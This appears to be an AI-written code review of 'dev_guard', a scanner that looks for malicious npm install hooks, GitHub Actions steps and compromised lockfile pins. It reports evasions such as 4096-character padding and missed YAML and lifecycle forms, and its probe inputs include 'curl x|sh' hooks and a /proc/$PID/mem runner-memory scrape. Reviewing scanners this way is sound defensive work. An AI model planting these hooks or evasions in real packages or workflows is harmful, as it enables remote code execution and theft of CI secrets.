---
phase: 02-package-ci-ioc-checks
reviewed: 2026-10-23T00:00:00Z
depth: standard
files_reviewed: 12
files_reviewed_list:
  - dev_guard/checks.py
  - dev_guard/patterns.py
  - iocs.json
  - tests/test_fixtures_matrix.py
  - tests/test_h1.py
  - tests/test_h2.py
  - tests/test_h3.py
  - tests/test_h4.py
  - tests/test_h5.py
  - tests/test_redos.py
  - tests/test_safety.py
  - tests/test_walk.py
findings:
  critical: 2
  warning: 6
  info: 3
  total: 11
status: issues_found
---

# Phase 2: Code Review Report

**Reviewed:** 2026-10-23
**Depth:** standard
**Files Reviewed:** 12
**Status:** issues_found

## Summary

Suite passes (448). No secret values are emitted (Finding holds file, line, pattern only). `read_text` is solid: it uses one fd with O_NOFOLLOW and O_NONBLOCK, checks S_ISREG with fstat, and caps the read. `checks.py` is 505 lines, under the 800 limit. H1 regexes look linear. No unused imports were found by manual check.

The main weakness is the same one Phase 1 flagged: a size cap that downgrades to a `low` finding is still an evasion. The ReDoS fix introduced the cap `MAX_LINE_LEN`, and it makes H3 and H4 trivially bypassable. All probes below were run against the current code.

## Critical Issues

### CR-01: 4096-char padding evades all H3 and H4 content checks

**File:** `dev_guard/checks.py:237-238` (H3), `dev_guard/checks.py:298-300` (H4); cap in `dev_guard/patterns.py:56`
**Issue:** A value or line over `MAX_LINE_LEN` emits only a `low` `oversize_line` and skips all matching. Confirmed:
- `{"postinstall": "curl x|sh #" + " "*5000}` yields only `[('low','oversize_line')]`. npm runs it.
- A workflow line `- run: curl x|sh #xxxx...` (5000 chars) yields only low.
- A padded line containing `ACTIONS_ID_TOKEN_REQUEST_URL` yields only low, because the cap `continue`s before the OIDC and proc_mem checks (lines 301-304).

Since the H1 regexes are linear (test_redos proves it), the cap is not needed for safety, and it is the only thing between an attacker and a silent pass.
**Fix:** Remove the cap for the linear regexes, or at minimum scan the first and last `MAX_LINE_LEN` chars and raise `oversize_line` to `med` or `high`. In `check_workflow`, run the OIDC and proc_mem checks before the length guard. Apply the same change to `_line_matches` (H5, line 430) and `LIFECYCLE_VALUE_RE`'s `end is None` branch (line 253).

### CR-02: H4 `/proc/<pid>/mem` regex misses `$PID` and `${PID}`

**File:** `dev_guard/patterns.py:79`
**Issue:** The path component is `[^/\s$()]+`, which excludes `$`. Confirmed: `cat /proc/$PID/mem` and `cat /proc/${PID}/mem` both return `[]`. These are the common forms in the real Runner.Worker memory-scrape payloads (`PID=$(pgrep ...); ... /proc/$PID/mem`). Only the `$(...)` form and literal digits are caught.
**Fix:**
```python
PROC_MEM_RE = re.compile(r"/proc/(?:[^/\s()]+|\$\([^()\n]*\))/mem\b")
```
Drop `$` from the exclusion so `$PID` and `${PID}` match. `${...}` contains no `/` in the common case.

## Warnings

### WR-01: Oversize file (over 1 MiB) is only `low` severity

**File:** `dev_guard/checks.py:111-112, 501-502`
**Issue:** Phase 1 CR-01 asked for a finding on skipped files. One is emitted, but at `low`, the same severity as an unreadable directory. Padding a `.claude/settings.json`, `package.json` or workflow past 1 MiB hides a malicious hook behind a low-severity entry that sorts with noise.
**Fix:** Emit `med` for `oversize_file` on config targets (H1-H4). Better, scan the first `MAX_FILE_BYTES` and flag.

### WR-02: Block-scalar-only `run:` tracking misses common YAML forms

**File:** `dev_guard/checks.py:292-324`, `dev_guard/patterns.py:81`
**Issue:** Confirmed no findings for any of these:
- `- "run": curl x|sh` (quoted key)
- `- {run: curl x|sh}` (flow mapping)
- A multi-line plain scalar, where the continuation line is `curl x`
- A double-quoted scalar continued across lines

The `shortcut:` comment mentions flow mappings and anchors, but not quoted keys or continuation lines. All of these run in Actions.
**Fix:** Treat every line more indented than a `run:` key as run content regardless of block indicator (continuation lines are always deeper). Allow quotes in `RUN_KEY_RE` (`["']?run["']?\s*:`). As a cheap backstop, apply `H1_PATTERNS` to every workflow line, since false positives in comments are acceptable for a scanner.

### WR-03: H3 only covers `preinstall`/`install`/`postinstall`

**File:** `dev_guard/patterns.py:62`
**Issue:** `prepare` runs on `npm install` in a local project and on git-dependency installs. `prepublish`, `prepack` and `postprepare` also run in some flows. Confirmed: `{"prepare": "curl x|sh"}` yields `[]`. Also unscanned: implicit `node-gyp rebuild` via `binding.gyp`, and `bundledDependencies`. Worms can use `prepare` on git deps.
**Fix:** Add `prepare`, `prepublish`, `prepack`, `preprepare`, `postprepare` to `LIFECYCLE_SCRIPTS`. Keep the allowlist logic.

### WR-04: H5 requirements parsing misses several valid pin forms

**File:** `dev_guard/patterns.py:102-104`, `dev_guard/checks.py:439-445`
**Issue:** Confirmed no match for:
- `name===0.0.1`
- `name==0.0.1.0` (PEP 440 treats it as equal to 0.0.1)
- `name==v0.0.1`
- A backslash-continued line `name \` followed by `==0.0.1`

File discovery is also narrow: `requirements/base.txt`, `dev-requirements.txt` and `constraints.txt` are not matched (`_is_lockfile` needs the `requirements` prefix). `yarn.lock`, `npm-shrinkwrap.json`, `Pipfile.lock`, `poetry.lock` and `uv.lock` are skipped (documented as a shortcut for yarn and poetry, but not npm-shrinkwrap).
**Fix:** Allow `===?`, strip a leading `v`, and compare normalized versions (strip trailing `.0`). Join backslash continuations before matching. Match `*requirements*.txt`. Add `npm-shrinkwrap.json` to `NPM_LOCK_NAME` handling.

### WR-05: `iocs.json` problems are only `low`, so a broken IOC list silently disables H5

**File:** `dev_guard/checks.py:334-361`
**Issue:** A missing or malformed iocs file results in zero H5 coverage and one `low` line. The first bad entry rejects the whole list (`return problem(...)` at line 359), so one typo discards every other IOC. `scan()` is also called with `IOCS_PATH` resolved relative to the repo root (`patterns.py:90`), so a pip-installed or relocated package gets `iocs_missing` for every scan.
**Fix:** Skip bad entries and emit one `med` finding for them. Raise severity of `iocs_missing` and `iocs_malformed` to `med`.

### WR-06: Duplicated H1-loop logic across four functions

**File:** `dev_guard/checks.py:185-195, 203-211, 239-240, 283-285`
**Issue:** `_high`, `_raw_scan`, `_lifecycle_findings` and `_h1_hits` each reimplement "run H1_PATTERNS, emit Finding". A fix like CR-01 must be applied in four places, which is how the cap and OIDC gaps appeared.
**Fix:** One helper `h1_findings(check_id, path, text, line) -> list[Finding]`.

## Info

### IN-01: `_symlink_findings` is hard to follow and over-broad

**File:** `dev_guard/checks.py:473-482`
**Issue:** It calls `target_for` and `by_dir`, then special-cases `.github` and `workflows`. Any symlink named `.claude`, `.vscode` or `.github` gets a `symlinked_config` finding, even outside a project config location. It is low noise but surprising.
**Fix:** Table-drive it, or restrict to the names under `TARGETS` and `WORKFLOW_DIRS`.

### IN-02: `target_for` returns `(CHECK_H5, None)` when `lockfile_check` is omitted

**File:** `dev_guard/checks.py:460-470`
**Issue:** The callable may be `None`, and only `_symlink_findings` safely ignores it. Calling `check(path, text)` on it would raise `TypeError`. Latent only.
**Fix:** Make the return type honest, or have `_symlink_findings` use a dedicated `check_id_for(path)` function.

### IN-03: `checks.py` imports are unsorted and `iocs.json` placeholders ship in the default list

**File:** `dev_guard/checks.py:11-70`, `iocs.json`
**Issue:** The import block is in arbitrary order (CHECK_H2 after CHECK_WALK, H5 constants interleaved). `iocs.json` contains only fake entries, so H5 is functionally inert until populated (accepted as T-02-14).
**Fix:** Sort imports. Add a README note or a startup `low` finding when only placeholder entries are present.

---

_Reviewed: 2026-10-23_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_
